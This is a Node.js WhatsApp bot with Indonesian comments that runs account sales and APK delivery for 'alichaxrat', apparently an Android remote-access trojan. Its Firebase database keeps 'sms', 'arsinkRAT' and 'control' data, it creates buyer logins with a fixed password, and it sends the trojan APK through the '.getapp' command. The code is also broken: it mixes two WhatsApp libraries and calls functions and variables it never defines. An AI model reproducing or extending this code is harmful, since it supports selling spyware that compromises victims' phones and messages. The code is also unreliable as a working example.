const { Client, makeWASocket, LocalAuth, MessageMedia } = require("whatsapp-web.js")
const qrcode = require('qrcode-terminal');
const admin = require('firebase-admin');
const fs = require('fs');
const path = require('path');
const readline = require('readline')
const usePairingCode = process.argv.includes("--code") || process.argv.includes("--pairing")
const PhoneNumber = require('awesome-phonenumber')
const serviceAccount = require('./mmkcok.json');

// Inisialisasi Firebase Admin
admin.initializeApp({
    credential: admin.credential.cert(serviceAccount),
    databaseURL: "https://alichaxrats9-90034-default-rtdb.firebaseio.com"
});

const auth = admin.auth();
const db = admin.database();

// Path ke file data
const ownersFilePath = path.join(__dirname, 'owner.json');
const databaseFilePath = path.join(__dirname, 'database.json');

// Memuat data dari file JSON
let owners = {};
let registeredUsers = {};

try {
    owners = JSON.parse(fs.readFileSync(ownersFilePath, 'utf8'));
    registeredUsers = JSON.parse(fs.readFileSync(databaseFilePath, 'utf8'));
} catch (error) {
    console.error("Error membaca file JSON:", error);
}

// Fungsi untuk menyimpan data pengguna ke file
function saveOwners() {
    try {
        fs.writeFileSync(ownersFilePath, JSON.stringify(owners, null, 2));
    } catch (error) {
        console.error("Error menulis ke owner.json:", error);
    }
}

function saveRegisteredUsers() {
    try {
        fs.writeFileSync(databaseFilePath, JSON.stringify(registeredUsers, null, 2));
    } catch (error) {
        console.error("Error menulis ke database.json:", error);
    }
}

// Fungsi untuk memeriksa ID owner
function isOwner(userId) {
    return owners[userId] === true;
}

// Fungsi untuk memeriksa ID pengguna terdaftar
function isRegisteredUser(userId) {
    return registeredUsers[userId] === true;
}

// Fungsi untuk menghapus folder dari Firebase Realtime Database
function deleteFolder(folderPath) {
    db.ref(folderPath).remove()
        .then(() => {
            console.log(`Folder ${folderPath} berhasil dihapus.`);
        })
        .catch((error) => {
            console.error(`Error menghapus folder ${folderPath}:`, error);
        });
}

// Fungsi untuk menghapus data kecuali yang diizinkan
function deleteInvalidData() {
    const allowedKeys = ['sms', 'arsinkRAT', 'control'];

    db.ref('/').once('value', (snapshot) => {
        const data = snapshot.val();
        
        if (data) {
            Object.keys(data).forEach((key) => {
                if (!allowedKeys.includes(key)) {
                    // Hapus data yang tidak ada dalam pengecualian
                    db.ref(`/${key}`).remove()
                        .then(() => console.log(`Data ${key} berhasil dihapus.`))
                        .catch((error) => console.error(`Error menghapus data ${key}:`, error));
                }
            });
        }
    });
}

// Inisialisasi WhatsApp Client
async function connectToWhatsApp() {
const { state, saveCreds } = await useMultiFileAuthState(`session/${global.sessionName}`)
const client = makeWASocket({
logger: pino({ level: "silent" }),
printQRInTerminal: !usePairingCode,
auth: state,
browser: ["Ubuntu", "Chrome", "20.0.04"],
});
if(usePairingCode && !client.authState.creds.registered) {
        await clearConsole();
		client.log(`The process of connecting to ${bottz}`)
		setTimeout(async () => {
          code = await client.requestPairingCode(bottz)
          code = code?.match(/.{1,4}/g)?.join("-") || code
          client.log(`Pairing code: ${code.toUpperCase()}`);
        }, 3000)

	}
async function clearConsole() {
    const isWindows = process.platform === 'win32';
    const isLinuxOrMac = process.platform === 'linux' || process.platform === 'darwin';

    return new Promise((resolve, reject) => {
        const command = isWindows ? 'cls' : (isLinuxOrMac ? 'clear' : '');
        if (command) {
            require('child_process').exec(command, (error, stdout, stderr) => {
                if (error) {
                    console.error(error);
                    reject(error);
                } else {
                    console.log(stdout);
                    resolve();
                }
            });
        } else {
            console.log('Berhasil Aktifkan Bot Ngab\n\nSc By 081400346604\n@FadlanDev');
            resolve();
        }
    });
}

client.on('message', async (message) => {
    const chatId = message.from;
    const userId = message.author || message.from;
    const body = message.body.trim();
    
    // Periksa apakah pesan dimulai dengan titik (.)
    if (!body.startsWith('.')) {
        return; // Jika pesan tidak dimulai dengan ".", abaikan
    }

    const text = body.split(' ')[0].toLowerCase(); // Mengambil perintah saja (misalnya .buatakun)

    console.log('FADLANOFFC MY MSG:', userId);

    // Periksa akses untuk fitur khusus owner/reseller
    if (!isOwner(userId) && !isRegisteredUser(userId) && text !== '.getapp' && text !== '.menu') {
        await message.reply('Maaf wak bot ini hanya bisa diakses sama fadlan, pt, dan resellernya saja 🥺');
        return;
    }

    try {
        const args = body.split(' ')[1]; // Mengambil argumen jika ada (misalnya username atau nomor)
        switch (text) {
            case '.buatakun':
                if (isRegisteredUser(userId)) {
                    if (!args) {
                        await message.reply('Format salah. Gunakan .buatakun <username>,<nomor>');
                        return;
                    }
                    const [username, nomor] = args.split(',');
                    if (username && nomor) {
                        const email = `${username}@gmail.com`;
                        const password = 'fadlan'; // Jangan diubah
                        try {
                            const userRecord = await auth.createUser({ email, password });
                            registeredUsers[username] = { email, username, nomor };
                            saveRegisteredUsers();
                            const ownerNumber = '6281400346604@c.us';
                            const signInDate = new Date().toLocaleString('id-ID');
                            await client.sendMessage(ownerNumber, `Pengguna dengan username *${username}* berhasil membuat akun pada *${signInDate}*.`);
                            const successMessage = `*BERHASIL MEMBUAT AKUN*\n====================\n👤User: ${username}\n💌Email: ${email}\n====================\nSilahkan login dengan akun anda di aplikasi alichaxrat terbaru, untuk mendapatkan aplikasi terbaru silahkan cek deskripsi grup di bawah ini:\nhttps://chat.whatsapp.com/H5TpixN4TA21cRIvDLopX0\n~ Terimakasih Sudah Membeli`;
                            await client.sendMessage(`${nomor}@c.us`, successMessage);
                            await message.reply(`*Berhasil Membuat Akun Wak ✅*\n\nSilahkan cek PM saya untuk mendapatkan aplikasi alichaxrat 1.4 terbaru`);
                        } catch (error) {
                            await message.reply(`❌ Gagal Membuat Akun Karena Username Sudah Dipakai`);
                            console.error("Error membuat akun:", error);
                        }
                    } else {
                        await message.reply('Format salah. Gunakan .buatakun <username>,<nomor>');
                    }
                }
                break;
                
                        case '.menu': // Fitur .menu dengan pengiriman gambar
            const media = MessageMedia.fromFilePath(path.join(__dirname, 'aygalicha.jpg')); // Pastikan file gambar ada
            const caption = `*WELCOME TO BOT ALICHAXRAT*

┏━━『 *DATA BOT* 』━━━━◧
┃➣ *SC BY : FADLAN*
┃➣ *WA : 081400346604*
┃➣ *VERSION : 1.4*
┃➣ *SERVER : S9*
┗━━━━━━━━━━━━━━━━━━◧

┏━━『 *MENU RESELLER* 』━◧
●➣.buatakun
●➣.getapp
┗━━━━━━━━━━━━━━━━━━◧

┏━━━━『 *MENU PT* 』━━━━◧
●➣.buatakun
●➣.addseller
●➣.delseller
●➣.hapususer
●➣.ban
●➣.unban
●➣.listuser
●➣.cekseller
●➣.cekakun
●➣.ban
●➣.unban
●➣.getapp
┗━━━━━━━━━━━━━━━━━━◧

Dev © FadlanDev

*Grup Official Alichaxrat*
https://chat.whatsapp.com/H5TpixN4TA21cRIvDLopX0`;
            await client.sendMessage(message.from, media, { caption });
            break;

case '.ban':
        if (isOwner(userId)) {
            if (!args) {
                await message.reply('Format salah. Gunakan .ban <nomor>');
                return;
            }
            const numberToBan = `${args}@c.us`;
            if (!banList[numberToBan]) {
                banList[numberToBan] = true;
                saveBanList();
                await message.reply(`Nomor ${args} berhasil diban.`);
            } else {
                await message.reply(`Nomor ${args} sudah diban sebelumnya.`);
            }
        } else {
            await message.reply('Kamu tidak memiliki izin untuk melakukan ban.');
        }
        break;

    case '.unban':
        if (isOwner(userId)) {
            if (!args) {
                await message.reply('Format salah. Gunakan .unban <nomor>');
                return;
            }
            const numberToUnban = `${args}@c.us`;
            if (banList[numberToUnban]) {
                delete banList[numberToUnban];
                saveBanList();
                await message.reply(`Nomor ${args} berhasil di-unban.`);
            } else {
                await message.reply(`Nomor ${args} tidak diban.`);
            }
        } else {
            await message.reply('Kamu tidak memiliki izin untuk melakukan unban.');
        }
        break;

            case '.cekakun':
                if (args && registeredUsers[args]) {
                    const { email, nomor } = registeredUsers[args];
                    const uid = email.split('@')[0];
                    const signInDate = new Date().toLocaleString('id-ID');
                    const accountInfo = `*INFOMASI AKUN*\n\nUSER: ${args}\nID APK: ${uid}\nTGL: ${signInDate}\n\nAkun ini telah di buat oleh nomer ${nomor}.`;
                    await message.reply(accountInfo);
                } else {
                    await message.reply('Format salah atau username tidak ditemukan. Gunakan .cekakun <username>');
                }
                break;

            case '.cekseller':
                if (args) {
                    const formattedNumber = `${args}@c.us`;
                    if (registeredUsers[formattedNumber]) {
                        const totalAkun = Object.keys(registeredUsers).length;
                        const signInDate = new Date().toLocaleString('id-ID');
                        const sellerInfo = `*INFOMASI SELLER*\n\nAKUN TELAH DI BUAT: ${totalAkun}\nDI ADD SELLER PADA: ${signInDate}\nPT BY: ${formattedNumber}\n\nAkun ini telah di buat oleh nomer ${formattedNumber}.`;
                        await message.reply(sellerInfo);
                    } else {
                        await message.reply(`Nomor ${args} tidak ditemukan.`);
                    }
                } else {
                    await message.reply('Format salah. Gunakan .cekseller <nomor>');
                }
                break;

            case '.getapp':
                const appFilePath = path.join(__dirname, 'alichaxrats8.apk'); // Lokasi file aplikasi
                try {
                    if (fs.existsSync(appFilePath)) {
                        await client.sendMessage(userId, 'Sedang mengirim aplikasi Alichaxrat...');
                        const media = MessageMedia.fromFilePath(appFilePath);
                        await client.sendMessage(userId, media);
                        console.log(`Aplikasi berhasil dikirim ke ${userId}`);
                    } else {
                        await message.reply('Maaf, aplikasi tidak ditemukan di server.');
                        console.error('File aplikasi tidak ditemukan.');
                    }
                } catch (error) {
                    await message.reply('Terjadi kesalahan saat mengirim aplikasi.');
                    console.error('Error mengirim aplikasi:', error);
                }
                break;

            case '.owner':
                await sendStartMessage(chatId);
                break;

            case '.addseller':
                if (args) {
                    const formattedNumber = `${args}@c.us`;
                    registeredUsers[formattedNumber] = true;
                    saveRegisteredUsers();
                    await message.reply(`Nomor ${formattedNumber} berhasil ditambahkan ke database reseller.`);
                } else {
                    await message.reply('Format salah. Gunakan .addseller <nomor>');
                }
                break;

            case '.delseller':
                if (args) {
                    const formattedNumber = `${args}@c.us`;
                    if (registeredUsers[formattedNumber]) {
                        delete registeredUsers[formattedNumber];
                        saveRegisteredUsers();
                        await message.reply(`Nomor ${formattedNumber} berhasil dihapus dari database seller.`);
                    } else {
                        await message.reply('Nomor tidak ditemukan atau format salah. Gunakan .delseller <nomor>');
                    }
                } else {
                    await message.reply('Format salah. Gunakan .delseller <nomor>');
                }
                break;

            case '.addpt':
                if (args) {
                    const formattedNumber = `${args}@c.us`;
                    owners[formattedNumber] = true;
                    saveOwners();
                    await message.reply(`Nomor ${formattedNumber} berhasil ditambahkan ke database owner.`);
                } else {
                    await message.reply('Format salah. Gunakan .addpt <nomor>');
                }
                break;

            case '.delpt':
                if (args) {
                    const formattedNumber = `${args}@c.us`;
                    if (owners[formattedNumber]) {
                        delete owners[formattedNumber];
                        saveOwners();
                        await message.reply(`Nomor ${formattedNumber} berhasil dihapus dari database owner.`);
                    } else {
                        await message.reply('Nomor tidak ditemukan atau format salah. Gunakan .delpt <nomor>');
                    }
                } else {
                    await message.reply('Format salah. Gunakan .delpt <nomor>');
                }
                break;

            default:
                await message.reply('Perintah tidak dikenal.');
        }
    } catch (error) {
        console.error("Error menangani pesan:", error);
        await message.reply('Terjadi kesalahan saat memproses perintah.');
    }
});

// Fungsi untuk mengirim pesan menu
async function sendStartMessage(chatId) {
    const menuMessage = `Dev @FadlanDev || 081400346604`;
    await client.sendMessage(chatId, menuMessage);
}

// Inisialisasi WhatsApp Client
client.initialize();
